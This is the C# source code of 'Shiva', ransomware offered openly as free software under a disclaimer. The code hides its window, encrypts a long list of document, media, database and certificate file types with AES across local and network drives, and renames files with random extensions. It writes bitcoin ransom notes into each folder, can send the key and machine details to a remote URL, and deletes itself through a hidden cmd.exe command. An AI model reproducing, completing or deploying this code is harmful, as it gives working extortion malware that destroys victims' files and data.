/*
  _________ ___ ___ ._______   _________   
 /   _____//   |   \|   \   \ /   /  _  \  
 \_____  \/    ~    \   |\   Y   /  /_\  \ 
 /        \    Y    /   | \     /    |    \
/_______  /\___|_  /|___|  \___/\____|__  /
        \/       \/                     \/ 
 * 
 * Coded by r00tk4 - Full /  / blackmath.it 
 * 
 * Features:
 * Uses AES algorithm to encrypt files.
 * Encrypt local and network disks.
 * Use random extensions for encrypted files.
 * Sends encryption key to a server.
 * Encrypted files can be decrypt in decrypter program with encryption key.
 * Creates a Html file with given message.
 * Small file size (210 KB)
 * 
 * This is a free software, Shiva is distribuited in the hope that will be
 * useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY 
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more detail
 * 
 * We are not responsible for any direct or indirect damage caused due to bad use of it.
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Management;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace shiva
{
    public partial class ShivaForm : Form
    {
        //Url to send encryption key and computer info
        string targetURL = "https://www.example.com/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        string charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/@^";
        

        public ShivaForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

            //Salt must be at least 8 byte, choose your flawor but remember to match it with decrypter!!!
            byte[] saltBytes = new byte[] { 1, 1, 2, 2, 3, 3, 4, 4 }; 

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreateRandomString(int length, String str)
        {
            string valid = str;
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }



        //Sends created password target location
        public void SendPassword(string password){
            
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            
            // If you want to store key on remote server, uncomment the line below and comment the localhost module
            // var conent = new System.Net.WebClient().DownloadString(fullUrl); 

            ///// Module to store Key on localhost for testing purpose //////
            string path = "\\Desktop\\ShivaKEY.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "THE KEY:", info};
            System.IO.File.WriteAllLines(fullpath, lines);
            ////////////////////////////////////////////////////////////////

        }


        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            try
            {
                File.WriteAllBytes(file, bytesEncrypted);
                String extension = CreateRandomString(6, "abcdefghijklmnopqrstuvwxyz1234567890");
                System.IO.File.Move(file, file + "." + extension );
            }
            catch (System.UnauthorizedAccessException E) { }
        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            try
            {
                //extensions to be encrypt
                var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
                ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", 
                ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk",
                ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx",
                ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay",
                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
                ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", 
                ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", 
                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
            };

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);

                for (int i = 0; i < files.Length; i++)
                {

                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {

                    //System folders Exclusion, be carefull, without this the OS will not works!!!
                    if (childDirectories[i].Contains("Windows") || childDirectories[i].Contains("Program Files") || childDirectories[i].Contains("Program Files (x86)")) continue;

                    encryptDirectory(childDirectories[i], password);
                    messageCreator(childDirectories[i]);
                }
            }
            catch (Exception e) { }
            
        }

        public void startAction()
        {
            //Generate a 15 character password
            string password = CreateRandomString(15, charSet);
            string path = "\\Desktop\\test";
            string startPath =  userDir + userName + path;
            SendPassword(password);
            //Logical + Remote drives
            string[] drives = System.IO.Directory.GetLogicalDrives();
            foreach (string str in drives)
            {
                //C: Override to avoid to cypher local disk for testing purpose
                //If you want to Cyper all comment the lines below till "else"
                if (str == "C:\\") 
                {  
                    encryptDirectory(startPath, password);
                    messageCreator(startPath);
                }
                else  
                encryptDirectory(str, password);
                messageCreator(str);
            }
            
            //Set password null to avoid in-memory detection
            password = null;
            selfDestroy();
            System.Windows.Forms.Application.Exit();
     
        }

        //Selfdestroy itself at the end 
        public void selfDestroy() {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C timeout 2 && Del /Q /F " + Application.ExecutablePath;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
        }

        //Create a message to store in every crypted path
        public void messageCreator(String path)
        {
            string[] lines = { "<html><body>Files has been encrypted with SHIVA", 
                               "Send me some bitcoins or say goodbye to your files...</body></html>" };
            try
            {
                System.IO.File.WriteAllLines(path + "\\READ_IT.html", lines);
            }
            catch(Exception e){}
            } 
    }

}
